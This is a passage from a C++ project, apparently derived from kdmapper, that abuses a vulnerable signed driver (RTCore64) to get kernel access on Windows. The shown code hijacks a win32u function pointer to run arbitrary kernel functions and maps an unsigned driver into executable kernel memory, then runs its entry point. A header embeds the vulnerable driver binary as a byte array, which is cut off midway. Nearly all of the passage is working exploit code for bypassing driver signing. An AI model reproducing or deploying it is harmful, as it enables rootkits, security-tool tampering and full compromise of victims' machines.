			Log(L"[-] Failed to get export win32u.NtUserSetGestureConfig" << std::endl);
			return false;
		}

		uintptr_t oNtUserSetGestureConfig = 0;

		if (!ReadMemory(device_handle, NtUserSetGestureConfig_ref, &oNtUserSetGestureConfig, sizeof(oNtUserSetGestureConfig)))
			return false;

		// Overwrite the pointer with kernel_function_address
		if (!WriteMemory(device_handle, NtUserSetGestureConfig_ref, &kernel_function_address, sizeof(kernel_function_address)))
			return false;

		// Call function
		if constexpr (!call_void) {
			using FunctionFn = T(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtUserSetGestureConfig);

			*out_result = Function(arguments...);
		}
		else {
			using FunctionFn = void(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtUserSetGestureConfig);

			Function(arguments...);
		}

		// Restore the pointer/jmp
		return WriteMemory(device_handle, NtUserSetGestureConfig_ref, &oNtUserSetGestureConfig, sizeof(oNtUserSetGestureConfig));
	}
}

```

`RTCore64_Vulnerability/kdmapper.cpp`:

```cpp
#include "kdmapper.hpp"


uint64_t kdmapper::AllocMdlMemory(HANDLE iqvw64e_device_handle, uint64_t size, uint64_t* mdlPtr) {
	/*added by psec*/
	LARGE_INTEGER LowAddress, HighAddress;
	LowAddress.QuadPart = 0;
	HighAddress.QuadPart = 0xffff'ffff'ffff'ffffULL;

	uint64_t pages = (size / PAGE_SIZE) + 1;
	auto mdl = intel_driver::MmAllocatePagesForMdl(iqvw64e_device_handle, LowAddress, HighAddress, LowAddress, pages * (uint64_t)PAGE_SIZE);
	if (!mdl) {
		Log(L"[-] Can't allocate pages for mdl" << std::endl);
		return { 0 };
	}

	uint32_t byteCount = 0;
	if (!intel_driver::ReadMemory(iqvw64e_device_handle, mdl + 0x028 /*_MDL : byteCount*/, &byteCount, sizeof(uint32_t))) {
		Log(L"[-] Can't read the _MDL : byteCount" << std::endl);
		return { 0 };
	}

	if (byteCount < size) {
		Log(L"[-] Couldn't allocate enough memory, cleaning up" << std::endl);
		intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdl);
		intel_driver::FreePool(iqvw64e_device_handle, mdl);
		return { 0 };
	}

	auto mappingStartAddress = intel_driver::MmMapLockedPagesSpecifyCache(iqvw64e_device_handle, mdl, nt::KernelMode, nt::MmCached, NULL, FALSE, nt::NormalPagePriority);
	if (!mappingStartAddress) {
		Log(L"[-] Can't set mdl pages cache, cleaning up." << std::endl);
		intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdl);
		intel_driver::FreePool(iqvw64e_device_handle, mdl);
		return { 0 };
	}

	const auto result = intel_driver::MmProtectMdlSystemAddress(iqvw64e_device_handle, mdl, PAGE_EXECUTE_READWRITE);
	if (!result) {
		Log(L"[-] Can't change protection for mdl pages, cleaning up" << std::endl);
		intel_driver::MmUnmapLockedPages(iqvw64e_device_handle, mappingStartAddress, mdl);
		intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdl);
		intel_driver::FreePool(iqvw64e_device_handle, mdl);
		return { 0 };
	}
	Log(L"[+] Allocated pages for mdl" << std::endl);

	if (mdlPtr)
		*mdlPtr = mdl;

	return mappingStartAddress;
}

uint64_t kdmapper::AllocIndependentPages(HANDLE device_handle, uint32_t size)
{
	const auto base = intel_driver::MmAllocateIndependentPagesEx(device_handle, size);
	if (!base)
	{
		Log(L"[-] Error allocating independent pages" << std::endl);
		return 0;
	}

	if (!intel_driver::MmSetPageProtection(device_handle, base, size, PAGE_EXECUTE_READWRITE))
	{
		Log(L"[-] Failed to change page protections" << std::endl);
		intel_driver::MmFreeIndependentPages(device_handle, base, size);
		return 0;
	}

	return base;
}

uint64_t kdmapper::MapDriver(HANDLE iqvw64e_device_handle, BYTE* data, ULONG64 param1, ULONG64 param2, bool free, bool destroyHeader, AllocationMode mode, bool PassAllocationAddressAsFirstParam, mapCallback callback, NTSTATUS* exitCode) {

	const PIMAGE_NT_HEADERS64 nt_headers = portable_executable::GetNtHeaders(data);

	if (!nt_headers) {
		Log(L"[-] Invalid format of PE image" << std::endl);
		return 0;
	}

	if (nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
		Log(L"[-] Image is not 64 bit" << std::endl);
		return 0;
	}

	uint32_t image_size = nt_headers->OptionalHeader.SizeOfImage;

	void* local_image_base = VirtualAlloc(nullptr, image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!local_image_base)
		return 0;

	DWORD TotalVirtualHeaderSize = (IMAGE_FIRST_SECTION(nt_headers))->VirtualAddress;
	image_size = image_size - (destroyHeader ? TotalVirtualHeaderSize : 0);

	uint64_t kernel_image_base = 0;
	uint64_t mdlptr = 0;
	if (mode == AllocationMode::AllocateMdl) {
		kernel_image_base = AllocMdlMemory(iqvw64e_device_handle, image_size, &mdlptr);
	}
	else if (mode == AllocationMode::AllocateIndependentPages) {
		kernel_image_base = AllocIndependentPages(iqvw64e_device_handle, image_size);
	}
	else { // AllocatePool by default
		kernel_image_base = intel_driver::AllocatePool(iqvw64e_device_handle, nt::POOL_TYPE::NonPagedPool, image_size);
	}

	if (!kernel_image_base) {
		Log(L"[-] Failed to allocate remote image in kernel" << std::endl);

		VirtualFree(local_image_base, 0, MEM_RELEASE);
		return 0;
	}

	do {
		Log(L"[+] Image base has been allocated at 0x" << reinterpret_cast<void*>(kernel_image_base) << std::endl);

		// Copy image headers

		memcpy(local_image_base, data, nt_headers->OptionalHeader.SizeOfHeaders);

		// Copy image sections

		const PIMAGE_SECTION_HEADER current_image_section = IMAGE_FIRST_SECTION(nt_headers);

		for (auto i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
			if ((current_image_section[i].Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) > 0)
				continue;
			auto local_section = reinterpret_cast<void*>(reinterpret_cast<uint64_t>(local_image_base) + current_image_section[i].VirtualAddress);
			memcpy(local_section, reinterpret_cast<void*>(reinterpret_cast<uint64_t>(data) + current_image_section[i].PointerToRawData), current_image_section[i].SizeOfRawData);
		}

		uint64_t realBase = kernel_image_base;
		if (destroyHeader) {
			kernel_image_base -= TotalVirtualHeaderSize;
			Log(L"[+] Skipped 0x" << std::hex << TotalVirtualHeaderSize << L" bytes of PE Header" << std::endl);
		}

		// Resolve relocs and imports

		RelocateImageByDelta(portable_executable::GetRelocs(local_image_base), kernel_image_base - nt_headers->OptionalHeader.ImageBase);

		if (!FixSecurityCookie(local_image_base, kernel_image_base ))
		{
			Log(L"[-] Failed to fix cookie" << std::endl);
			return 0;
		}

		if (!ResolveImports(iqvw64e_device_handle, portable_executable::GetImports(local_image_base))) {
			Log(L"[-] Failed to resolve imports" << std::endl);
			kernel_image_base = realBase;
			break;
		}

		// Write fixed image to kernel

		if (!intel_driver::WriteMemory(iqvw64e_device_handle, realBase, (PVOID)((uintptr_t)local_image_base + (destroyHeader ? TotalVirtualHeaderSize : 0)), image_size)) {
			Log(L"[-] Failed to write local image to remote image" << std::endl);
			kernel_image_base = realBase;
			break;
		}

		// Call driver entry point

		const uint64_t address_of_entry_point = kernel_image_base + nt_headers->OptionalHeader.AddressOfEntryPoint;

		Log(L"[<] Calling DriverEntry 0x" << reinterpret_cast<void*>(address_of_entry_point) << std::endl);

		if (callback) {
			if (!callback(&param1, &param2, realBase, image_size, mdlptr)) {
				Log(L"[-] Callback returns false, failed!" << std::endl);
				kernel_image_base = realBase;
				break;
			}
		}

		NTSTATUS status = 0;
		if (!intel_driver::CallKernelFunction(iqvw64e_device_handle, &status, address_of_entry_point, (PassAllocationAddressAsFirstParam ? realBase : param1), param2)) {
			Log(L"[-] Failed to call driver entry" << std::endl);
			kernel_image_base = realBase;
			break;
		}

		if (exitCode)
			*exitCode = status;

		Log(L"[+] DriverEntry returned 0x" << std::hex << status << std::endl);

		// Free memory
		if (free) {
			Log(L"[+] Freeing memory" << std::endl);
			bool free_status = false;

			if (mode == AllocationMode::AllocateMdl) {
				free_status = intel_driver::MmUnmapLockedPages(iqvw64e_device_handle, realBase, mdlptr);
				free_status = (!free_status ? false : intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdlptr));
				free_status = (!free_status ? false : intel_driver::FreePool(iqvw64e_device_handle, mdlptr));
			}
			else if (mode == AllocationMode::AllocateIndependentPages)
			{
				free_status = intel_driver::MmFreeIndependentPages(iqvw64e_device_handle, realBase, image_size);
			}
			else {
				free_status = intel_driver::FreePool(iqvw64e_device_handle, realBase);
			}

			if (free_status) {
				Log(L"[+] Memory has been released" << std::endl);
			}
			else {
				Log(L"[-] WARNING: Failed to free memory!" << std::endl);
			}
		}



		VirtualFree(local_image_base, 0, MEM_RELEASE);
		return realBase;

	} while (false);


	VirtualFree(local_image_base, 0, MEM_RELEASE);

	Log(L"[+] Freeing memory" << std::endl);
	bool free_status = false;

	if (mode == AllocationMode::AllocateMdl) {
		free_status = intel_driver::MmUnmapLockedPages(iqvw64e_device_handle, kernel_image_base, mdlptr);
		free_status = (!free_status ? false : intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdlptr));
		free_status = (!free_status ? false : intel_driver::FreePool(iqvw64e_device_handle, mdlptr));
	}
	else if (mode == AllocationMode::AllocateIndependentPages)
	{
		free_status = intel_driver::MmFreeIndependentPages(iqvw64e_device_handle, kernel_image_base, image_size);
	}
	else {
		free_status = intel_driver::FreePool(iqvw64e_device_handle, kernel_image_base);
	}

	if (free_status) {
		Log(L"[+] Memory has been released" << std::endl);
	}
	else {
		Log(L"[-] WARNING: Failed to free memory!" << std::endl);
	}

	return 0;
}

void kdmapper::RelocateImageByDelta(portable_executable::vec_relocs relocs, const uint64_t delta) {
	for (const auto& current_reloc : relocs) {
		for (auto i = 0u; i < current_reloc.count; ++i) {
			const uint16_t type = current_reloc.item[i] >> 12;
			const uint16_t offset = current_reloc.item[i] & 0xFFF;

			if (type == IMAGE_REL_BASED_DIR64)
				*reinterpret_cast<uint64_t*>(current_reloc.address + offset) += delta;
		}
	}
}

// Fix cookie by @Jerem584
bool kdmapper::FixSecurityCookie(void* local_image, uint64_t kernel_image_base)
{
	auto headers = portable_executable::GetNtHeaders(local_image);
	if (!headers)
		return false;

	auto load_config_directory = headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress;
	if (!load_config_directory)
	{
		Log(L"[+] Load config directory wasn't found, probably StackCookie not defined, fix cookie skipped" << std::endl);
		return true;
	}
	
	auto load_config_struct = (PIMAGE_LOAD_CONFIG_DIRECTORY)((uintptr_t)local_image + load_config_directory);
	auto stack_cookie = load_config_struct->SecurityCookie;
	if (!stack_cookie)
	{
		Log(L"[+] StackCookie not defined, fix cookie skipped" << std::endl);
		return true; // as I said, it is not an error and we should allow that behavior
	}

	stack_cookie = stack_cookie - (uintptr_t)kernel_image_base + (uintptr_t)local_image; //since our local image is already relocated the base returned will be kernel address

	if (*(uintptr_t*)(stack_cookie) != 0x2B992DDFA232) {
		Log(L"[-] StackCookie already fixed!? this probably wrong" << std::endl);
		return false;
	}

	Log(L"[+] Fixing stack cookie" << std::endl);

	auto new_cookie = 0x2B992DDFA232 ^ GetCurrentProcessId() ^ GetCurrentThreadId(); // here we don't really care about the value of stack cookie, it will still works and produce nice result
	if (new_cookie == 0x2B992DDFA232)
		new_cookie = 0x2B992DDFA233;

	*(uintptr_t*)(stack_cookie) = new_cookie; // the _security_cookie_complement will be init by the driver itself if they use crt
	return true;
}

bool kdmapper::ResolveImports(HANDLE iqvw64e_device_handle, portable_executable::vec_imports imports) {
	for (const auto& current_import : imports) {
		ULONG64 Module = utils::GetKernelModuleAddress(current_import.module_name);
		if (!Module) {
#if !defined(DISABLE_OUTPUT)
			std::cout << "[-] Dependency " << current_import.module_name << " wasn't found" << std::endl;
#endif
			return false;
		}

		for (auto& current_function_data : current_import.function_datas) {
			uint64_t function_address = intel_driver::GetKernelModuleExport(iqvw64e_device_handle, Module, current_function_data.name);

			if (!function_address) {
				//Lets try with ntoskrnl
				if (Module != intel_driver::ntoskrnlAddr) {
					function_address = intel_driver::GetKernelModuleExport(iqvw64e_device_handle, intel_driver::ntoskrnlAddr, current_function_data.name);
					if (!function_address) {
#if !defined(DISABLE_OUTPUT)
						std::cout << "[-] Failed to resolve import " << current_function_data.name << " (" << current_import.module_name << ")" << std::endl;
#endif
						return false;
					}
				}
			}

			*current_function_data.address = function_address;
		}
	}

	return true;
}

```

`RTCore64_Vulnerability/kdmapper.hpp`:

```hpp
#pragma once
#include <Windows.h>
#include <iostream>
#include <string>
#include <stdint.h>

#include "portable_executable.hpp"
#include "utils.hpp"
#include "nt.hpp"
#include "intel_driver.hpp"

#define PAGE_SIZE 0x1000

namespace kdmapper
{
	enum class AllocationMode
	{
		AllocatePool,
		AllocateMdl,
		AllocateIndependentPages
	};

	typedef bool (*mapCallback)(ULONG64* param1, ULONG64* param2, ULONG64 allocationPtr, ULONG64 allocationSize, ULONG64 mdlptr);

	//Note: if you set PassAllocationAddressAsFirstParam as true, param1 will be ignored
	uint64_t MapDriver(HANDLE iqvw64e_device_handle, BYTE* data, ULONG64 param1 = 0, ULONG64 param2 = 0, bool free = false, bool destroyHeader = true, AllocationMode mode = AllocationMode::AllocatePool, bool PassAllocationAddressAsFirstParam = false, mapCallback callback = nullptr, NTSTATUS* exitCode = nullptr);
	void RelocateImageByDelta(portable_executable::vec_relocs relocs, const uint64_t delta);
	bool FixSecurityCookie(void* local_image, uint64_t kernel_image_base);
	bool ResolveImports(HANDLE iqvw64e_device_handle, portable_executable::vec_imports imports);
	uint64_t AllocIndependentPages(HANDLE device_handle, uint32_t size);
	uint64_t AllocMdlMemory(HANDLE iqvw64e_device_handle, uint64_t size, uint64_t* mdlPtr);
}
```

`RTCore64_Vulnerability/nt.hpp`:

```hpp
#pragma once
#include <Windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

namespace nt
{
	constexpr auto PAGE_SIZE = 0x1000;
	constexpr auto STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;

	constexpr auto SystemModuleInformation = 11;
	constexpr auto SystemHandleInformation = 16;
	constexpr auto SystemExtendedHandleInformation = 64;
	
	typedef NTSTATUS(*NtLoadDriver)(PUNICODE_STRING DriverServiceName);
	typedef NTSTATUS(*NtUnloadDriver)(PUNICODE_STRING DriverServiceName);
	typedef NTSTATUS(*RtlAdjustPrivilege)(_In_ ULONG Privilege, _In_ BOOLEAN Enable, _In_ BOOLEAN Client, _Out_ PBOOLEAN WasEnabled);

	typedef struct _SYSTEM_HANDLE
	{
		PVOID Object;
		HANDLE UniqueProcessId;
		HANDLE HandleValue;
		ULONG GrantedAccess;
		USHORT CreatorBackTraceIndex;
		USHORT ObjectTypeIndex;
		ULONG HandleAttributes;
		ULONG Reserved;
	} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

	typedef struct _SYSTEM_HANDLE_INFORMATION_EX
	{
		ULONG_PTR HandleCount;
		ULONG_PTR Reserved;
		SYSTEM_HANDLE Handles[1];
	} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

	//Thanks to Pvt Comfy for remember to update this https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ne-wdm-_pool_type
	typedef enum class _POOL_TYPE {
		NonPagedPool,
		NonPagedPoolExecute = NonPagedPool,
		PagedPool,
		NonPagedPoolMustSucceed = NonPagedPool + 2,
		DontUseThisType,
		NonPagedPoolCacheAligned = NonPagedPool + 4,
		PagedPoolCacheAligned,
		NonPagedPoolCacheAlignedMustS = NonPagedPool + 6,
		MaxPoolType,
		NonPagedPoolBase = 0,
		NonPagedPoolBaseMustSucceed = NonPagedPoolBase + 2,
		NonPagedPoolBaseCacheAligned = NonPagedPoolBase + 4,
		NonPagedPoolBaseCacheAlignedMustS = NonPagedPoolBase + 6,
		NonPagedPoolSession = 32,
		PagedPoolSession = NonPagedPoolSession + 1,
		NonPagedPoolMustSucceedSession = PagedPoolSession + 1,
		DontUseThisTypeSession = NonPagedPoolMustSucceedSession + 1,
		NonPagedPoolCacheAlignedSession = DontUseThisTypeSession + 1,
		PagedPoolCacheAlignedSession = NonPagedPoolCacheAlignedSession + 1,
		NonPagedPoolCacheAlignedMustSSession = PagedPoolCacheAlignedSession + 1,
		NonPagedPoolNx = 512,
		NonPagedPoolNxCacheAligned = NonPagedPoolNx + 4,
		NonPagedPoolSessionNx = NonPagedPoolNx + 32,
	} POOL_TYPE;

	typedef struct _RTL_PROCESS_MODULE_INFORMATION
	{
		HANDLE Section;
		PVOID MappedBase;
		PVOID ImageBase;
		ULONG ImageSize;
		ULONG Flags;
		USHORT LoadOrderIndex;
		USHORT InitOrderIndex;
		USHORT LoadCount;
		USHORT OffsetToFileName;
		UCHAR FullPathName[256];
	} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

	typedef struct _RTL_PROCESS_MODULES
	{
		ULONG NumberOfModules;
		RTL_PROCESS_MODULE_INFORMATION Modules[1];
	} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

	/*added by psec*/
	typedef enum _MEMORY_CACHING_TYPE_ORIG {
		MmFrameBufferCached = 2
	} MEMORY_CACHING_TYPE_ORIG;

	typedef enum _MEMORY_CACHING_TYPE {
		MmNonCached = FALSE,
		MmCached = TRUE,
		MmWriteCombined = MmFrameBufferCached,
		MmHardwareCoherentCached,
		MmNonCachedUnordered,       // IA64
		MmUSWCCached,
		MmMaximumCacheType,
		MmNotMapped = -1
	} MEMORY_CACHING_TYPE;

	typedef CCHAR KPROCESSOR_MODE;

	typedef enum _MODE {
		KernelMode,
		UserMode,
		MaximumMode
	} MODE;

	typedef enum _MM_PAGE_PRIORITY {
		LowPagePriority,
		NormalPagePriority = 16,
		HighPagePriority = 32
	} MM_PAGE_PRIORITY;
	/**/
}

```

`RTCore64_Vulnerability/portable_executable.cpp`:

```cpp
#include "portable_executable.hpp"

PIMAGE_NT_HEADERS64 portable_executable::GetNtHeaders(void* image_base) {
	const auto dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(image_base);

	if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
		return nullptr;

	const auto nt_headers = reinterpret_cast<PIMAGE_NT_HEADERS64>(reinterpret_cast<uint64_t>(image_base) + dos_header->e_lfanew);

	if (nt_headers->Signature != IMAGE_NT_SIGNATURE)
		return nullptr;

	return nt_headers;
}

portable_executable::vec_relocs portable_executable::GetRelocs(void* image_base) {
	const PIMAGE_NT_HEADERS64 nt_headers = GetNtHeaders(image_base);

	if (!nt_headers)
		return {};

	vec_relocs relocs;
	DWORD reloc_va = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;

	if (!reloc_va) //Fix from @greetmark of UnknownCheats Forum
		return {};

	auto current_base_relocation = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<uint64_t>(image_base) + reloc_va);
	const auto reloc_end = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<uint64_t>(current_base_relocation) + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size);

	while (current_base_relocation < reloc_end && current_base_relocation->SizeOfBlock) {
		RelocInfo reloc_info;

		reloc_info.address = reinterpret_cast<uint64_t>(image_base) + current_base_relocation->VirtualAddress;
		reloc_info.item = reinterpret_cast<uint16_t*>(reinterpret_cast<uint64_t>(current_base_relocation) + sizeof(IMAGE_BASE_RELOCATION));
		reloc_info.count = (current_base_relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t);

		relocs.push_back(reloc_info);

		current_base_relocation = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<uint64_t>(current_base_relocation) + current_base_relocation->SizeOfBlock);
	}

	return relocs;
}

portable_executable::vec_imports portable_executable::GetImports(void* image_base) {
	const PIMAGE_NT_HEADERS64 nt_headers = GetNtHeaders(image_base);

	if (!nt_headers)
		return {};

	DWORD import_va = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

	//not imports necesary
	if (!import_va)
		return {};

	vec_imports imports;

	auto current_import_descriptor = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(reinterpret_cast<uint64_t>(image_base) + import_va);

	while (current_import_descriptor->FirstThunk) {
		ImportInfo import_info;

		import_info.module_name = std::string(reinterpret_cast<char*>(reinterpret_cast<uint64_t>(image_base) + current_import_descriptor->Name));

		auto current_first_thunk = reinterpret_cast<PIMAGE_THUNK_DATA64>(reinterpret_cast<uint64_t>(image_base) + current_import_descriptor->FirstThunk);
		auto current_originalFirstThunk = reinterpret_cast<PIMAGE_THUNK_DATA64>(reinterpret_cast<uint64_t>(image_base) + current_import_descriptor->OriginalFirstThunk);

		while (current_originalFirstThunk->u1.Function) {
			ImportFunctionInfo import_function_data;

			auto thunk_data = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(reinterpret_cast<uint64_t>(image_base) + current_originalFirstThunk->u1.AddressOfData);

			import_function_data.name = thunk_data->Name;
			import_function_data.address = &current_first_thunk->u1.Function;

			import_info.function_datas.push_back(import_function_data);

			++current_originalFirstThunk;
			++current_first_thunk;
		}

		imports.push_back(import_info);
		++current_import_descriptor;
	}

	return imports;
}
```

`RTCore64_Vulnerability/portable_executable.hpp`:

```hpp
#pragma once
#include <Windows.h>
#include <stdint.h>
#include <vector>
#include <string>

namespace portable_executable
{
	struct RelocInfo
	{
		uint64_t address;
		uint16_t* item;
		uint32_t count;
	};

	struct ImportFunctionInfo
	{
		std::string name;
		uint64_t* address;
	};

	struct ImportInfo
	{
		std::string module_name;
		std::vector<ImportFunctionInfo> function_datas;
	};

	using vec_sections = std::vector<IMAGE_SECTION_HEADER>;
	using vec_relocs = std::vector<RelocInfo>;
	using vec_imports = std::vector<ImportInfo>;

	PIMAGE_NT_HEADERS64 GetNtHeaders(void* image_base);
	vec_relocs GetRelocs(void* image_base);
	vec_imports GetImports(void* image_base);
}
```

`RTCore64_Vulnerability/rtcore64_driver_resource.h`:

```h
#pragma once
namespace rtcore64_driver_resource
{
	// array size is 14024
	static const unsigned char driver[] = {
	  0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00,
	  0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc8, 0x00, 0x00, 0x00,
	  0x0e, 0x1f, 0xba, 0x0e, 0x00, 0xb4, 0x09, 0xcd, 0x21, 0xb8, 0x01, 0x4c, 0xcd, 0x21, 0x54, 0x68,
	  0x69, 0x73, 0x20, 0x70, 0x72, 0x6f, 0x67, 0x72, 0x61, 0x6d, 0x20, 0x63, 0x61, 0x6e, 0x6e, 0x6f,
	  0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6e, 0x20, 0x69, 0x6e, 0x20, 0x44, 0x4f, 0x53, 0x20,
	  0x6d, 0x6f, 0x64, 0x65, 0x2e, 0x0d, 0x0d, 0x0a, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0xe9, 0x48, 0x38, 0xdd, 0xad, 0x29, 0x56, 0x8e, 0xad, 0x29, 0x56, 0x8e, 0xad, 0x29, 0x56, 0x8e,
	  0xd6, 0x0a, 0x4f, 0x8e, 0xaf, 0x29, 0x56, 0x8e, 0xad, 0x29, 0x57, 0x8e, 0xbc, 0x29, 0x56, 0x8e,
	  0x32, 0x21, 0x2d, 0x8e, 0xae, 0x29, 0x56, 0x8e, 0x19, 0x21, 0x3b, 0x8e, 0xac, 0x29, 0x56, 0x8e,
	  0x32, 0x21, 0x2e, 0x8e, 0xac, 0x29, 0x56, 0x8e, 0x52, 0x69, 0x63, 0x68, 0xad, 0x29, 0x56, 0x8e,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x45, 0x00, 0x00, 0x64, 0x86, 0x05, 0x00,
	  0x85, 0x54, 0xee, 0x57, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0x00, 0x2e, 0x01,
	  0x0b, 0x02, 0x08, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0xc0, 0x1a, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x10, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x05, 0x00, 0x02, 0x00, 0x05, 0x00, 0x02, 0x00,
	  0x05, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00,
	  0x4c, 0x04, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x3c, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00,
	  0x00, 0x1a, 0x00, 0x00, 0xc8, 0x1c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x20, 0x00, 0x00, 0x98, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x2e, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00, 0x64, 0x0b, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
	  0x00, 0x0c, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x68, 0x2e, 0x72, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
	  0x2c, 0x01, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x48,
	  0x2e, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x58, 0x00, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00,
	  0x00, 0x02, 0x00, 0x00, 0x00, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0xc8, 0x2e, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
	  0x60, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x48,
	  0x49, 0x4e, 0x49, 0x54, 0x00, 0x00, 0x00, 0x00, 0x58, 0x02, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00,
	  0x00, 0x04, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0xe2, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
